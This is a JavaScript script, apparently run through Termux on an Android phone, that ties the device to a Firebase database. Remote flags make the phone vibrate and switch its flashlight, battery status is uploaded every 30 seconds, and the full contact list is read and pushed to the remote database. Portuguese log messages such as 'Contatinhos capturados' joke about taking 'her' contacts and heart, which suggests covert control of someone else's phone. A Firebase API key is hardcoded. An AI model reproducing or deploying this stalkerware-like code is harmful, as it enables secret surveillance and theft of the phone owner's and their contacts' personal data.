import { initializeApp } from "firebase/app";
import { getDatabase, ref, onValue, set, push} from "firebase/database";
import { exec } from "child_process";
import { error } from "console";
import { stdout } from "process";


const firebaseConfig = {
    apiKey: "AIzaSyBmfmYuR4YAWGOyUMiawYMymg49T-ZK20A",


  authDomain: "smartphonedbtest.firebaseapp.com",


  databaseURL: "https://smartphonedbtest-default-rtdb.firebaseio.com",


  projectId: "smartphonedbtest",


  storageBucket: "smartphonedbtest.firebasestorage.app",


  messagingSenderId: "188691501053",


  appId: "1:188691501053:web:88cfdabbd6406f10c45394",


  measurementId: "G-K8HMHBEJG8"
};


const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const vibrarRef = ref(db, "vibrador/vibrar");
const lanternaRef = ref(db, "lanterna/status");
const bateriaRef = ref(db, "bateria/status");
const zoioRef = ref(db, "audio-zoio/status");
const contatosRef = ref(db, "contatos");


onValue(vibrarRef, (snapshot) => {
    const vibrar = snapshot.val();
    if (vibrar) {
        console.log("Vibrando princesa😏...");
        exec("termux-vibrate -d 5000 -f", (error) => {
            if (error) {
                console.error("Não vibrou😔", error);
            } else {
                console.log("Descansar né princesa? Ngm é de ferro");
                set(vibrarRef, false);
            }
        });
    }
});


onValue(lanternaRef, (snapshot) => {
    const ligarLanterna = snapshot.val();
    if (ligarLanterna) {
        console.log("Virou boate?😏");
        exec("termux-torch on", (error) => {
            if (error) {
                console.error("Só vejo escuridão", error);
            }
        });
    } else {
        console.log("Faltou energia?😔");
        exec("termux-torch off");
    }
});


function atualizarStatusBateria() {
    exec("termux-battery-status", (error, stdout) => {
        if (error) {
            console.error("Num tô conseguindo chegar no coração da morena😔");
            return;
        }


        const dadosBateria = JSON.parse(stdout);
        set(bateriaRef, {
            current: dadosBateria.current,
            health: dadosBateria.health,
            percentage: dadosBateria.percentage,
            plugged: dadosBateria.plugged,
            status: dadosBateria.status,
            temperature: dadosBateria.temperature
        }).then(() => {
            console.log("Tome-le status do coração dela😈!")
        }).catch((err) => {
            console.log("Tu não quer o coração dela não é bixo😒?")
        });
    });
}


setInterval(atualizarStatusBateria, 30000);


atualizarStatusBateria();


// onValue(zoioRef, (snapshot) => {
//     const tiraTira = snapshot.val();
//     if (tiraTira) {
//         console.log("Tira, tira!!!😲");


//         exec("termux-media-player play midias/audio_zoio.mp3", (error) => {
//             if (error) {
//                 console.error("Vou tirar não😏", error);
//             } else {
//                 console.log("Eu vou tirar😵!");


//                 const monitorarReproducao = setInterval(() => {
//                     exec("termux-media-player info", (err, stdout) => {
//                         if (err) {
//                             console.error("Erro ao obter status do player:", err);
//                             clearInterval(monitorarReproducao);
//                         } else {
//                             try {
//                                 const status = JSON.parse(stdout);
//                                 if (status.Playing === false) {
//                                     console.log("Áudio terminou, alterando Firebase...");
//                                     set(zoioRef, false);
//                                     clearInterval(monitorarReproducao);
//                                 }
//                             } catch (parseError) {
//                                 console.error("Erro ao analisar status do player:", parseError);
//                             }
//                         }
//                     });
//                 }, 1000);
//             }
//         });
//     } else {
//         exec("termux-media-player pause");
//     }
// });


function atualizarContatos() {
    exec("termux-contact-list", (error, stdout) => {
        if (error) {
            console.error("Quer pegar os contatinhos dela bixo😒?");
            return;
        }


        try {
            const listaContatos = JSON.parse(stdout);
            console.log("A lista tá vindo...");


            listaContatos.forEach((contato) => {
                push(contatosRef, {
                    name: contato.name || "Sem Nome",
                    number: contato.number || "Sem Número"
                });
            });


            console.log("Contatinhos capturados😡!");
        } catch (parseError) {
            console.error("Erro, glória🙌", parseError);
        }
    });
}


atualizarContatos();